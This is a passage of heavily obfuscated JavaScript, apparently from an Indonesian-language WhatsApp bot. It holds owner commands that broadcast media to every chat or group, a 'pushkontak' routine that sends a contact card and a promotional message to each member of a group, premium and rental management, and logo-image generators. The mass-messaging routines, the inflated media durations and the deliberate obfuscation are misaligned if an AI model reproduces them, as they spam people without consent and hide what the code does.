                _0x101b1f = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x3b33cc = fs[_0x5804c8(0x456)](_0x101b1f);
            for (let _0x425527 of _0x49d063) {
                let _0x3cae26 = _0x5804c8(0x434) + _0x1b04cf;
                _0x614da8[_0x5804c8(0x938)](_0x425527, {
                    'video': _0x3b33cc,
                    'caption': _0x3cae26,
                    'mimetype': _0x5804c8(0x280),
                    'duration': 0x362fa05d
                }, {
                    'quoted': _0x51e31f
                });
            }
            _0x358f3b(_0x5804c8(0xcc3));
        }
        break;
        case _0x5804c8(0x3d9):
        case _0x5804c8(0xcb9): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!/audio/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b('Reply audio dengan caption ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd35));
            let _0x3b1453 = await _0x588c41[_0x5804c8(0x56a)][_0x5804c8(0xc4d)]()[_0x5804c8(0x686)](_0x3a211a => _0x3a211a['id']),
                _0x4921d2 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x53dd63 = fs[_0x5804c8(0x456)](_0x4921d2);
            for (let _0x1e8a13 of _0x3b1453) {
                let _0x5b3eb7 = _0x5804c8(0x434) + _0x1b04cf;
                _0x614da8['sendMessage'](_0x1e8a13, {
                    'audio': _0x53dd63,
                    'mimetype': _0x5804c8(0x8d4),
                    'ptt': ![],
                    'duration': 0x362fa05d
                }, {
                    'quoted': _0x51e31f
                });
            }
            _0x358f3b(_0x5804c8(0xcc3));
        }
        break;
        case _0x5804c8(0x27f): {
            if (!_0x7b6ab6) return _0x358f3b(mess['OnlyOwner']);
            if (!/audio/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b('Reply audio dengan caption ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd35));
            let _0x5574ed = await _0x588c41[_0x5804c8(0x56a)][_0x5804c8(0xc4d)]()['map'](_0x146f72 => _0x146f72['id']),
                _0x5f3218 = await _0x614da8['downloadAndSaveMediaMessage'](_0x8a4e1a),
                _0x11fd0b = fs[_0x5804c8(0x456)](_0x5f3218);
            for (let _0x54be30 of _0x5574ed) {
                let _0x3fa613 = '「 BROADCAST 」\x0a\x0a' + _0x1b04cf;
                _0x614da8['sendMessage'](_0x54be30, {
                    'audio': _0x11fd0b,
                    'mimetype': _0x5804c8(0x8d4),
                    'ptt': !![],
                    'duration': 0x362fa05d
                }, {
                    'quoted': _0x51e31f
                });
            }
            _0x358f3b('Sukses Broadcast');
        }
        break;
        case _0x5804c8(0x577):
        case _0x5804c8(0xb08):
        case _0x5804c8(0x6c7): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b('Reply stiker dengan caption ' + (_0x3b7c58 + _0x453fc1));
            let _0x427a0a = await _0x588c41[_0x5804c8(0x56a)][_0x5804c8(0xc4d)]()[_0x5804c8(0x686)](_0x5994d9 => _0x5994d9['id']),
                _0x1dc8e7 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x39893d = fs['readFileSync'](_0x1dc8e7);
            for (let _0x5711e3 of _0x427a0a) {
                let _0x1ec998 = '「 BROADCAST 」\x0a\x0a' + _0x1b04cf;
                _0x614da8[_0x5804c8(0x938)](_0x5711e3, {
                    'sticker': {
                        'url': _0x1dc8e7
                    }
                }, {
                    'quoted': _0x51e31f
                });
            }
            _0x358f3b(_0x5804c8(0xcc3));
        }
        break;
        case 'bc':
        case _0x5804c8(0x79b): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd35));
            let _0x4bf503 = await _0x588c41[_0x5804c8(0x56a)][_0x5804c8(0xc4d)]()['map'](_0x5a04cd => _0x5a04cd['id']),
                _0x4e954e = await _0x614da8[_0x5804c8(0x905)]('' + _0x932571[_0x5804c8(0x527)], 0x12c, 0x12c);
            _0x358f3b('Mengirim Broadcast Ke ' + _0x4bf503[_0x5804c8(0x977)] + _0x5804c8(0x4e6) + _0x4bf503[_0x5804c8(0x977)] * 1.5 + _0x5804c8(0xc65));
            for (let _0x31ff2b of _0x4bf503) {
                await sleep(0x5dc), _0x614da8[_0x5804c8(0x938)](_0x31ff2b, {
                    'image': {
                        'url': 'https://telegra.ph/file/5beafc90f688c8ad48b7d.png'
                    },
                    'caption': _0x5804c8(0x74e) + _0x1b04cf
                });
            }
            _0x358f3b(_0x5804c8(0xcc3));
        }
        break;
        case _0x5804c8(0x76e):
        case _0x5804c8(0x5ae): {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x9f3));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xc9a) + (_0x3b7c58 + _0x453fc1) + ' teks|jeda\x0a\x0aReply Gambar Untuk Mengirim Gambar Ke Semua Group\x0aUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik');
            await _0x54c78e(_0x5804c8(0x944));
            let _0x29dda2 = await _0x614da8[_0x5804c8(0x674)](),
                _0x33fd0c = Object[_0x5804c8(0x1cd)](_0x29dda2)['slice'](0x0)[_0x5804c8(0x686)](_0x3f54ec => _0x3f54ec[0x1]),
                _0x46a1de = _0x33fd0c['map'](_0x44f6fb => _0x44f6fb['id']);
            for (let _0x5244b0 of _0x46a1de) {
                let _0x489aba = await _0x614da8[_0x5804c8(0x5b3)](_0x5244b0),
                    _0x443509 = await _0x489aba[_0x5804c8(0x8d7)];
                /image/ ['test'](_0x2b1d7d) ? (media = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a), mem = await uptotelegra(media), await _0x614da8[_0x5804c8(0x938)](_0x5244b0, {
                    'image': {
                        'url': mem
                    },
                    'caption': _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0],
                    'mentions': _0x443509[_0x5804c8(0x686)](_0x2f5354 => _0x2f5354['id'])
                }), await sleep(_0x1b04cf[_0x5804c8(0x4bd)]('|')[0x1])) : (await _0x614da8[_0x5804c8(0x938)](_0x5244b0, {
                    'text': _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0],
                    'mentions': _0x443509['map'](_0x184c3d => _0x184c3d['id'])
                }), await sleep(_0x1b04cf[_0x5804c8(0x4bd)]('|')[0x1]));
            }
            _0x358f3b(_0x5804c8(0x7bf));
        }
        break;
        case 'pushkontak': {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x9f3));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x533));
            var _0x14b7e3 = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0],
                _0xc17b97 = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x1];
            if (!_0x14b7e3) return _0x358f3b(_0x5804c8(0x735) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x256));
            if (!_0xc17b97) return _0x358f3b('Masukan nama lu yang bener cok\x0a contoh: ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x256));
            let _0x1ddeea = {
                    'displayName': _0x5804c8(0xa66),
                    'contacts': [{
                        'displayName': _0x14b7e3,
                        'vcard': 'BEGIN:VCARD\x0aVERSION:3.0\x0aN:;' + _0x14b7e3 + _0x5804c8(0x680) + _0x14b7e3 + '\x0aitem1.TEL;waid=' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + ':' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x814)
                    }]
                },
                _0x10afe4 = await _0x614da8[_0x5804c8(0x5b3)](_0x1b1e88[_0x5804c8(0x60f)]);
            if (_0x10afe4[_0x5804c8(0x8d7)][_0x5804c8(0x977)] > 0xc8) return _0x358f3b('Batas member maksimal; 200');
            _0x358f3b('Gasken pushkontak total member ' + _0x10afe4[_0x5804c8(0x8d7)][_0x5804c8(0x977)] + _0x5804c8(0xa51));
            for (let _0x350868 of _0x10afe4[_0x5804c8(0x8d7)]) {
                _0x614da8[_0x5804c8(0x938)](_0x350868['id'], {
                    'contacts': _0x1ddeea
                }), await sleep(0x1f4), _0x614da8[_0x5804c8(0x938)](_0x350868['id'], {
                    'text': _0xc17b97,
                    'contextInfo': {
                        'externalAdReply': {
                            'title': _0x358b6e,
                            'body': _0x5804c8(0x2e4),
                            'previewType': _0x5804c8(0x465),
                            'showAdAttribution': !![],
                            'sourceUrl': _0x3b4ae4,
                            'thumbnailUrl': _0xfc3dc4
                        }
                    }
                }), await sleep(0x1f4);
            }
            _0x358f3b(_0x5804c8(0xd51) + _0x10afe4[_0x5804c8(0x75a)] + _0x5804c8(0xc0b) + _0x10afe4[_0x5804c8(0x8d7)][_0x5804c8(0x977)] + _0x5804c8(0x1b5));
        }
        break;
        case 'delchat':
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            var _0x39c4be = q ? q : _0x1b1e88[_0x5804c8(0x60f)];
            await _0x614da8[_0x5804c8(0x408)]({
                'delete': !![],
                'lastMessages': [{
                    'key': _0x1b1e88[_0x5804c8(0x2a9)],
                    'messageTimestamp': _0x1b1e88[_0x5804c8(0x8e2)]
                }]
            }, _0x39c4be), _0x358f3b(_0x5804c8(0xd6b));
            break;
        case _0x5804c8(0x47d): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x995) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd35));
            _0x1c7aed(_0x5804c8(0x513), _0x1b1e88['sender'], _cmd);
            for (let _0x5069c7 of sewa) {
                await _0x614da8[_0x5804c8(0x938)](_0x5069c7['id'], {
                    'text': _0x1b04cf
                }), await sleep(0xbb8);
            }
            _0x358f3b(_0x5804c8(0x7f1) + sewa['length']);
        }
        break;
        case _0x5804c8(0xbd7): {
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            const _0x19ee72 = _0x83eae5[_0x5804c8(0xc6c)](' '),
                _0xe265d4 = _0x19ee72[_0x5804c8(0x4bd)]('|')[0x0],
                _0x3970ab = _0x19ee72[_0x5804c8(0x4bd)]('|')[0x1];
            if (!_0xe265d4) return _0x358f3b(_0x5804c8(0xa7a) + _0x3b7c58 + 'addprem* @tag|waktu\x0a*' + _0x3b7c58 + 'addprem* nomor|waktu\x0a\x0aContoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xc71));
            if (!_0x3970ab) return _0x358f3b(_0x5804c8(0x904));
            let _0x503050 = _0x1b1e88['quoted'] ? _0x1b1e88[_0x5804c8(0x6a4)]['sender'] : _0x1b04cf[_0x5804c8(0xa72)](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            if (_0x503050) _0x1c7aed(_0x5804c8(0x4c1), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _prem[_0x5804c8(0x97b)]((_0xe265d4[_0x5804c8(0xa72)]('@', '') + _0x5804c8(0x7cd))[_0x5804c8(0xa72)](' @', '@'), _0x3970ab, premium), _0x358f3b('Sukses');
            else {
                var _0x31e31c = await _0x614da8[_0x5804c8(0x9a9)](_0xe265d4 + _0x5804c8(0x7cd));
                if (_0x31e31c[_0x5804c8(0x977)] == 0x0) return _0x358f3b(_0x5804c8(0xace));
                _0x1c7aed(_0x5804c8(0x4c1), _0x1b1e88['sender'], _cmd), _prem[_0x5804c8(0x97b)]((_0xe265d4[_0x5804c8(0xa72)]('@', '') + _0x5804c8(0x7cd))['replace'](' @', '@'), _0x3970ab, premium), _0x358f3b(_0x5804c8(0x366));
            }
        }
        break;
        case _0x5804c8(0x9fe):
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x83eae5[0x0]) return _0x358f3b(_0x5804c8(0xa7a) + _0x3b7c58 + 'delprem* @tag\x0a*' + _0x3b7c58 + _0x5804c8(0xa95));
            let _0x12861c = _0x1b1e88['quoted'] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf[_0x5804c8(0xa72)](/[^0-9]/g, '') + '@s.whatsapp.net';
            if (_0x12861c) _0x1c7aed(_0x5804c8(0xd83), _0x1b1e88[_0x5804c8(0xd13)], _cmd), premium['splice'](_prem[_0x5804c8(0xcf7)](_0x12861c, premium), 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x9c3), JSON[_0x5804c8(0x736)](premium)), _0x358f3b(_0x5804c8(0xd6b));
            else {
                var _0x411b4e = await _0x614da8[_0x5804c8(0x9a9)](_0x83eae5[0x0] + _0x5804c8(0x7cd));
                if (_0x411b4e[_0x5804c8(0x977)] == 0x0) return _0x358f3b(_0x5804c8(0xace));
                _0x1c7aed(_0x5804c8(0xd83), _0x1b1e88[_0x5804c8(0xd13)], _cmd), premium['splice'](_prem[_0x5804c8(0xcf7)](_0x83eae5[0x0] + '@s.whatsapp.net', premium), 0x1), fs['writeFileSync'](_0x5804c8(0x9c3), JSON[_0x5804c8(0x736)](premium)), _0x358f3b(_0x5804c8(0xd6b));
            }
            break;
        case _0x5804c8(0x373):
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (_0x1b04cf < 0x2) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *linkgc waktu*\x0a\x0aContoh : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x92c));
            if (!isUrl(_0x83eae5[0x0])) return _0x358f3b(mess[_0x5804c8(0x5d2)]['Iv']);
            var _0x13e962 = _0x83eae5[0x0];
            _0x1c7aed('#addsewa', _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x13e962 = _0x13e962[_0x5804c8(0x4bd)]('https://chat.whatsapp.com/')[0x1];
            if (!_0x1b04cf) return _0x358f3b('Waktunya?');
            var _0x31a247 = await _0x614da8[_0x5804c8(0x2cc)](_0x13e962);
            if (_sewa[_0x5804c8(0x9ca)](_0x31a247, sewa)) return _0x358f3b(_0x5804c8(0x47b));
            _sewa[_0x5804c8(0xb7c)](_0x31a247, _0x83eae5[0x1], sewa), _0x358f3b(_0x5804c8(0x8f6));
            break;
        case 'delsewa':
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x7da));
            if (!_0x585e2d) return _0x358f3b('Bot tidak disewa di Grup ini');
            _0x1c7aed('#delsewa', _0x1b1e88[_0x5804c8(0xd13)], _cmd), sewa['splice'](_sewa[_0x5804c8(0x723)](_0x83eae5[0x0] ? _0x83eae5[0x0] : _0x1b1e88['chat'], sewa), 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x8cf), JSON[_0x5804c8(0x736)](sewa, null, 0x2)), _0x358f3b(_0x5804c8(0x366));
            break;
        case _0x5804c8(0xbda):
            if (!_0x7b6ab6) return _0x358f3b(mess[_0x5804c8(0x4f8)]);
            _0x1c7aed(_0x5804c8(0xa15), _0x1b1e88[_0x5804c8(0xd13)], _cmd), limit = [], fs['writeFileSync'](_0x5804c8(0x99e), JSON[_0x5804c8(0x736)](limit, null, 0x2)), glimit = [], fs['writeFileSync'](_0x5804c8(0xc07), JSON[_0x5804c8(0x736)](glimit, null, 0x2)), _0x358f3b(_0x5804c8(0x1c5));
            break;
        case _0x5804c8(0x5ca):
        case 'horror':
        case 'game8bit':
        case _0x5804c8(0x2ba):
        case _0x5804c8(0x7b3):
        case _0x5804c8(0xc30):
        case _0x5804c8(0x4db):
        case _0x5804c8(0x1bc):
        case _0x5804c8(0x3d6):
        case _0x5804c8(0x5be):
        case _0x5804c8(0x84f):
        case _0x5804c8(0x858):
        case _0x5804c8(0x83f):
        case _0x5804c8(0x9c4):
        case 'avengers':
        case _0x5804c8(0xc5c):
        case _0x5804c8(0xcc2):
        case 'metalg2':
        case 'lion':
        case 'wolf_bw':
        case _0x5804c8(0x510):
        case 'ninja':
        case _0x5804c8(0xb91):
        case _0x5804c8(0x237):
        case _0x5804c8(0x7e2):
        case _0x5804c8(0x427): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + ' *text|text2*');
            if (!q['includes']('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x9ed));
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x41df61 = await getBuffer(_0x5804c8(0x365) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0xb28) + m2 + '&apikey=' + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x41df61,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x407685 => {
                const _0x7a4fbc = _0x5804c8;
                _0x358f3b(util[_0x7a4fbc(0xb27)](_0x407685));
            });
        }
        break;
        case 'photooxymenu': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b('╭─▸ *PHOTOOXY MENU*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ ' + _0x3b7c58 + _0x5804c8(0x576) + _0x3b7c58 + _0x5804c8(0x5cc) + _0x3b7c58 + _0x5804c8(0x90b) + _0x3b7c58 + '*silk-text (Text)*\x0a│5 ▸ ' + _0x3b7c58 + '*smoke-typography (Text)*\x0a│6 ▸ ' + _0x3b7c58 + _0x5804c8(0x4e9) + _0x3b7c58 + _0x5804c8(0x6c3) + _0x3b7c58 + _0x5804c8(0xccc) + _0x3b7c58 + '*coffeecup2 (Text)*\x0a│10 ▸ ' + _0x3b7c58 + _0x5804c8(0xd33) + _0x3b7c58 + '*harry-potter2 (Text)*\x0a│12 ▸ ' + _0x3b7c58 + _0x5804c8(0x266) + _0x3b7c58 + _0x5804c8(0x8cd) + _0x3b7c58 + '*watermelon (Text)*\x0a│15 ▸ ' + _0x3b7c58 + _0x5804c8(0xa0a) + _0x3b7c58 + _0x5804c8(0xca4) + _0x3b7c58 + _0x5804c8(0x42a) + _0x3b7c58 + _0x5804c8(0xa3b) + _0x3b7c58 + _0x5804c8(0x8c0) + _0x3b7c58 + _0x5804c8(0x738) + _0x3b7c58 + _0x5804c8(0x677) + _0x3b7c58 + _0x5804c8(0x8be) + _0x3b7c58 + _0x5804c8(0x54a) + _0x3b7c58 + _0x5804c8(0x25b) + _0x3b7c58 + _0x5804c8(0xc03) + _0x3b7c58 + _0x5804c8(0xce1) + _0x3b7c58 + _0x5804c8(0xa5d) + _0x3b7c58 + _0x5804c8(0x38e) + _0x3b7c58 + _0x5804c8(0xd59) + _0x3b7c58 + '*army-camouflage (Text)*\x0a│31 ▸ ' + _0x3b7c58 + _0x5804c8(0x92f) + _0x3b7c58 + '*rainbow-shine (Text)*\x0a│33 ▸ ' + _0x3b7c58 + _0x5804c8(0xb70) + _0x3b7c58 + '*quotes-underfall (Text)*\x0a│35 ▸ ' + _0x3b7c58 + _0x5804c8(0x3ff) + _0x3b7c58 + '*yellow-rose (Text)*\x0a│37 ▸ ' + _0x3b7c58 + '*love-text (Text)*\x0a│38 ▸ ' + _0x3b7c58 + _0x5804c8(0x367) + _0x3b7c58 + '*nature-text (Text)*\x0a│40 ▸ ' + _0x3b7c58 + _0x5804c8(0xa1c) + _0x3b7c58 + _0x5804c8(0x3b1) + _0x3b7c58 + _0x5804c8(0x3c6) + _0x3b7c58 + _0x5804c8(0x7b0) + _0x3b7c58 + _0x5804c8(0x782) + _0x3b7c58 + _0x5804c8(0x3e3) + _0x3b7c58 + _0x5804c8(0x656) + _0x3b7c58 + _0x5804c8(0x7ae) + _0x3b7c58 + _0x5804c8(0x83a) + _0x3b7c58 + _0x5804c8(0xc2b) + _0x3b7c58 + _0x5804c8(0xa73) + _0x3b7c58 + _0x5804c8(0xb5a) + _0x3b7c58 + _0x5804c8(0xaed) + _0x3b7c58 + '*coffecup (Text)*\x0a│54 ▸ ' + _0x3b7c58 + _0x5804c8(0x31c) + _0x3b7c58 + _0x5804c8(0x72a) + _0x3b7c58 + _0x5804c8(0xa7d));
        }
        break;
        case 'battlegrounds-logo':
        case _0x5804c8(0xa61):
        case 'text-8bit': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x9ed));
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x9ed));
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x4cbda4 = await getBuffer(_0x5804c8(0x8e9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0xb28) + m2 + _0x5804c8(0xcc7) + _0x932571['BotKey']);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x4cbda4,
                'caption': 'Done kak'
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x3ac5e2 => {
                _0x358f3b(util['format'](_0x3ac5e2));
            });
        }
        break;
        case _0x5804c8(0x8e6):
        case 'under-flower':
        case _0x5804c8(0xa4e):
        case _0x5804c8(0x632):
        case _0x5804c8(0x2a6):
        case _0x5804c8(0xcc1):
        case _0x5804c8(0x560):
        case _0x5804c8(0x596):
        case _0x5804c8(0x82e):
        case _0x5804c8(0x609):
        case _0x5804c8(0x9f6):
        case _0x5804c8(0xb4e):
        case _0x5804c8(0x431):
        case _0x5804c8(0x354):
        case _0x5804c8(0x3ca):
        case 'striking':
        case 'metallicglow':
        case 'rainbow-text':
        case _0x5804c8(0x9aa):
        case _0x5804c8(0x826):
        case _0x5804c8(0xc0a):
        case _0x5804c8(0xa1b):
        case _0x5804c8(0xd38):
        case _0x5804c8(0x2c0):
        case 'glow-rainbow':
        case 'gradient-avatar':
        case 'white-cube':
        case _0x5804c8(0x3a8):
        case _0x5804c8(0x3eb):
        case _0x5804c8(0xac1):
        case _0x5804c8(0x3fc):
        case _0x5804c8(0x807):
        case _0x5804c8(0x34f):
        case 'smoky-neon':
        case _0x5804c8(0x156):
        case 'vector-nature':
        case 'yellow-rose':
        case _0x5804c8(0xa7c):
        case _0x5804c8(0x6ab):
        case 'nature-text':
        case _0x5804c8(0x8e3):
        case _0x5804c8(0x76a):
        case _0x5804c8(0xd45):
        case _0x5804c8(0xb4c):
        case 'quotes-undergrass':
        case _0x5804c8(0x307):
        case 'love-message':
        case _0x5804c8(0x34c):
        case 'burn-paper':
        case _0x5804c8(0xc2c):
        case _0x5804c8(0x9a6):
        case _0x5804c8(0x50f):
        case _0x5804c8(0x5d1):
        case _0x5804c8(0x67c): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa7f));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0xb64a6 = await getBuffer(_0x5804c8(0x8e9) + _0x453fc1 + _0x5804c8(0xbb0) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            try {
                await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': _0xb64a6,
                    'caption': _0x5804c8(0x3b7)
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x33f38c) {
                _0x358f3b(mess[_0x5804c8(0x5d2)][_0x5804c8(0x344)]);
            }
        }
        break;
        case _0x5804c8(0x51f):
        case 'logoaccording':
        case _0x5804c8(0xbd6):
        case 'letterlogos': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|text2|thumb*\x0a*Untuk List Thumb Ketik .list' + _0x453fc1 + '*');
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb4a) + _0x453fc1 + '*');
            mm = _0x83eae5['join'](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], m3 = mm[_0x5804c8(0x4bd)]('|')[0x2], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x12acc1 = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + '&text2=' + m2 + _0x5804c8(0x879) + m3 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xc67)]);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x12acc1,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x12c680 => {
                _0x358f3b('*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*');
            });
        }
        break;
        case _0x5804c8(0xbe2): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcfc));
        }
        break;
        case _0x5804c8(0x2e5): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xadc));
        }
        break;
        case _0x5804c8(0x8ce): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x226));
        }
        break;
        case 'listletterlogos': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xb4b));
        }
        break;
        case 'bannerofpubg':
        case _0x5804c8(0x368):
        case _0x5804c8(0xd84):
        case _0x5804c8(0xb2e):
        case 'gunlogogaming':
        case 'companylogo':
        case _0x5804c8(0x2c1):
        case _0x5804c8(0xc73): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *text|text2|background*\x0a*Untuk List Background Ketik .list' + _0x453fc1 + '*');
            if (!q['includes']('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x3e5) + _0x453fc1 + '*');
            mm = _0x83eae5[_0x5804c8(0xc6c)](' '), m1 = mm[_0x5804c8(0x4bd)]('|')[0x0], m2 = mm[_0x5804c8(0x4bd)]('|')[0x1], m3 = mm['split']('|')[0x2], _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x56efe1 = await getBuffer(_0x5804c8(0xcd9) + _0x453fc1 + _0x5804c8(0xbb0) + m1 + _0x5804c8(0xb28) + m2 + '&background=' + m3 + '&apikey=' + _0x932571['BotKey']);
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x56efe1,
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x1d973c => {
                const _0x1f66a7 = _0x5804c8;
                _0x358f3b(_0x1f66a7(0x26f));
            });
        }
        break;
        case _0x5804c8(0xce6): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
